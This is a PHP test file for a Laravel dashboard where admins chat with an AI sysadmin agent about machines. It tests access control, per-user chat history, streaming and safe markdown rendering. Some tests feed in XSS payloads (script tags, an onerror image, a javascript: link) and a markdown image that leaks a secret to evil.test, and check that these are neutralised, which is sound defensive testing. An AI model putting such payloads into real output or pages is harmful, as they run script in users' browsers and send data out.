<?php

use App\Ai\Agents\SysadminAgent;
use App\Ai\ScanRunner;
use App\Livewire\MachineChat;
use App\Models\AgentRun;
use App\Models\ChatMessage;
use App\Models\Machine;
use App\Models\User;
use App\Support\SafeMarkdown;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Laravel\Ai\Streaming\Events\TextDelta;
use Livewire\Livewire;
use Tests\TestCase;

uses(TestCase::class, RefreshDatabase::class);

it('does not serve the dashboard or its Livewire endpoint to guests', function () {
    $machine = Machine::factory()->create();

    $this->get(route('machines.show', $machine))->assertRedirect(route('login'))->assertDontSee($machine->name);
    Livewire::test(MachineChat::class, ['machine' => $machine])->assertForbidden();
});

it('keeps non-admin users out of the dashboard and refuses their Livewire calls', function () {
    $machine = Machine::factory()->create();
    $this->actingAs(User::factory()->create());

    $this->get(route('machines.show', $machine))->assertForbidden()->assertDontSee($machine->name);
    Livewire::test(MachineChat::class, ['machine' => $machine])->assertForbidden();
});

it('never lets is_admin be mass assigned', function () {
    $user = User::create(['name' => 'x', 'email' => 'x@example.org', 'password' => 'secret', 'is_admin' => true]);

    expect($user->fresh()->is_admin)->toBeFalse();
});

it('embeds the chat in a tab of the machine page', function () {
    $this->actingAs(User::factory()->admin()->create());
    $machine = Machine::factory()->create();

    $this->get(route('machines.show', ['machine' => $machine, 'tab' => 'chat']))->assertOk()->assertSee('Chat with the agent');
});

it('answers through the agent and keeps the conversation per user', function () {
    SysadminAgent::fake(['Disk usage is fine.']);
    $user = User::factory()->admin()->create();
    $machine = Machine::factory()->create();
    $this->actingAs($user);

    Livewire::test(MachineChat::class, ['machine' => $machine])
        ->set('message', 'How is the disk?')
        ->call('send')
        ->assertSee('How is the disk?')
        ->assertSee('Disk usage is fine.')
        ->assertSet('message', '');

    expect(ChatMessage::where('user_id', $user->id)->pluck('role')->all())->toBe(['user', 'assistant'])
        ->and(AgentRun::first()->objective)->toBe('How is the disk?');

    $other = User::factory()->admin()->create();
    $this->actingAs($other);
    Livewire::test(MachineChat::class, ['machine' => $machine])->assertDontSee('How is the disk?');
});

it('validates and escapes messages', function () {
    $this->actingAs(User::factory()->admin()->create());
    $machine = Machine::factory()->create();
    ChatMessage::create(['machine_id' => $machine->id, 'user_id' => auth()->id(), 'role' => 'assistant', 'content' => '<script>alert(1)</script>']);

    Livewire::test(MachineChat::class, ['machine' => $machine])
        ->assertDontSeeHtml('<script>alert(1)</script>')
        ->set('message', '')->call('send')->assertHasErrors('message');
});

it('emits streaming events to the callback and stores the final answer', function () {
    SysadminAgent::fake(['Streamed answer.']);
    $deltas = '';

    $run = app(ScanRunner::class)->reply(Machine::factory()->create(), 'hello', [], function ($event) use (&$deltas) {
        if ($event instanceof TextDelta) {
            $deltas .= $event->delta;
        }
    });

    expect($deltas)->toBe('Streamed answer.')
        ->and($run->status)->toBe('completed')
        ->and($run->report)->toBe('Streamed answer.');
});

it('renders markdown safely: formatting kept, raw html escaped, images and unsafe links neutralised', function () {
    $html = SafeMarkdown::render("**bold** and `code`\n\n- one\n- two\n\n<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n![t](https://evil.test/leak?d=secret)\n\n[bad](javascript:alert(1)) [ok](https://example.com)");

    expect($html)->toContain('<strong>bold</strong>', '<code>code</code>', '<li>one</li>', 'href="https://example.com"', 'rel="')
        ->not->toContain('<script', '<img', 'javascript:', 'evil.test/leak?')
        ->toContain('&lt;script&gt;');
});
